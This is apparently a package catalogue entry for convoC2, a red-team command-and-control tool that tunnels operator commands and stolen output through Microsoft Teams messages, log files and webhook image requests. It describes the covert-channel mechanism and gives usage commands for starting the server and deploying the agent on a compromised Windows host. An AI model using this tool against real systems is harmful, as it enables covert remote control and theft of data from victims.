---
name: "convoc2"
categories:
  - backdoor
version: "0.1.0-0parrot7"
homepage: ""
origin: "parrot"
recipe: "parrot-repo"
packaged-by: [parrot]
build-system: go
meta-checked: "2026-11-09"
github-repo: "cxnturi0n/convoC2"
github-stars: 762
github-pushed: "2025-01-15"
github-archived: false
github-issues: 1
github-match: "search"
gh-checked: "2026-11-07"
worth: 4.1
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
github-commits-year: 0
gh-activity-checked: "2026-11-09"
---

# convoc2

> Command-and-control that tunnels operator commands and output through Microsoft Teams messages and log files.

## What it's for

convoC2 is a C2 infrastructure in two parts — a Go server run by the operator and a Windows agent — that abuses Microsoft Teams as its transport. Commands are smuggled inside hidden `<span aria-label="...">` tags in ordinary Teams messages; the agent watches the victim's local Teams log file, executes commands it finds there, and returns output as Adaptive Card image URLs that trigger out-of-band HTTP requests to the operator's webhook channel. The victim machine only ever talks to Microsoft endpoints, and the commands execute even if the victim never opens or accepts the chat. Prerequisites sit on the operator side: a public host accepting inbound HTTP on port 80, a Teams channel with a Workflow Incoming Webhook kept open in a browser window, and the Teams thread ID plus bearer token extracted from an authenticated chat-creation request. It is a red-team tool for demonstrating Teams-based covert channels, not a general backdoor.

## Typical use cases

### Start the C2 server

Bring up the operator side on a public-facing host.

```
./convoC2_server_amd64
```

Outcome: the server TUI starts (defaults: binds `0.0.0.0`, waits up to 30 s per command for output — tune with `-b/--bindIp` and `-t/--msgTimeout`); agents then check in, and captured command output arrives as Adaptive Cards in the webhook Teams channel. Keep a browser window open on that channel or the server sees no agent traffic.

### Point a Windows agent at the server

Deploy the agent on the compromised host where Teams runs.

```
convoC2_agent.exe -s http://198.51.100.10/ -w https://example.com/webhook -v
```

Outcome: the agent polls the local Teams log file (default once per second, `-t` to change), executes commands hidden in incoming messages, and posts results back through `-w` webhook Adaptive Card image requests; `-v` enables verbose logging. Teams merely needs to be running in the background on the host.

*No corpus evidence — derived from upstream documentation.*
